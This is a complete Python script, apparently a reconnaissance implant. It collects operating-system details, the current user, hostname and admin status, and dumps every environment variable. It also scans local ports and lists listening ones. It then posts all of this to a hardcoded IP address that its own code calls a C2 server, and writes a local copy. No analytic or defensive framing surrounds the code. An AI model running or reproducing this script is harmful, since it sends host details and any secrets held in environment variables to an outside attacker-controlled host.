import platform
import os
import getpass
import socket
import psutil
import ctypes
import json
import requests
import logging

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)

log_path = "logs.json"

logging.debug("Starting system information gathering...")
os_name = platform.system()
os_version = platform.version()
architecture = platform.architecture()[0]
current_user = getpass.getuser()
hostname = platform.node()
os_release = platform.release()
uname = platform.uname()
machine = platform.machine()
processor = platform.processor()
python_version = platform.python_version()
environment_variables = os.environ

if os_name == "Windows":
    windows_version = platform.win32_ver()
else:
    windows_version = None

is_admin = False
if os_name == "Windows":
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        logging.warning(f"Error checking admin rights: {e}")
        is_admin = False

target = "127.0.0.1"
open_ports = []

logging.debug("Starting open port scanning...")

start_port = 1
end_port = 101  # Limiting to first 100 ports for testing

for port in range(start_port, end_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    try:
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        logging.debug(f"Port {port} scan result: {'open' if result == 0 else 'closed'}")
    except Exception as e:
        logging.warning(f"Error scanning port {port}: {e}")
    finally:
        sock.close()

logging.debug("Fetching system listening ports using psutil...")
connections = psutil.net_connections()
for conn in connections:
    if conn.status == 'LISTEN':
        logging.debug(f"Port {conn.laddr.port} is open (PID {conn.pid})")

recon_data = {
    "os_name": os_name,
    "os_version": os_version,
    "os_release": os_release,
    "architecture": architecture,
    "hostname": hostname,
    "current_user": current_user,
    "machine": machine,
    "processor": processor,
    "python_version": python_version,
    "windows_version": windows_version,
    "is_admin": is_admin,
    "open_ports": open_ports,
    "env_vars": dict(environment_variables),
}

payload = {
    "recon_data": recon_data
}

logging.debug("System fingerprint data gathered:")
logging.debug(json.dumps(recon_data, indent=4))

logging.info("=== System Fingerprinting ===")
logging.info(f"OS Name       : {os_name}")
logging.info(f"OS Version    : {os_version}")
logging.info(f"OS Release    : {os_release}")
logging.info(f"Architecture  : {architecture}")
logging.info(f"Hostname      : {hostname}")
logging.info(f"Current User  : {current_user}")
logging.info(f"Machine Type  : {machine}")
logging.info(f"Processor     : {processor}")
logging.info(f"Python Version: {python_version}")
logging.info(f"Windows Ver   : {windows_version}")
logging.info(f"Uname         : {uname}")
logging.info(f"Is Admin      : {is_admin}")
logging.info(f"Open ports    : {open_ports}")

c2_url = "http://85.215.240.40:8000/api/submit_scan/"

logging.debug(f"Attempting to send data to {c2_url}...")
try:
    response = requests.post(c2_url, json=payload, timeout=10)
    logging.debug(f"HTTP request sent. Status code: {response.status_code}")
    if response.status_code == 200:
        logging.info("Recon data successfully sent to C2")
    else:
        logging.error(f"Failed to send recon data: {response.status_code}")
except requests.exceptions.RequestException as e:
    logging.error(f"Error sending data to C2: {e}")

logging.debug(f"Saving recon data to {log_path}...")
try:
    with open(log_path, "w") as f:
        json.dump(payload, f, indent=4)
    logging.info(f"Payload successfully saved to {log_path}")
except Exception as e:
    logging.error(f"Error saving payload to {log_path}: {e}")
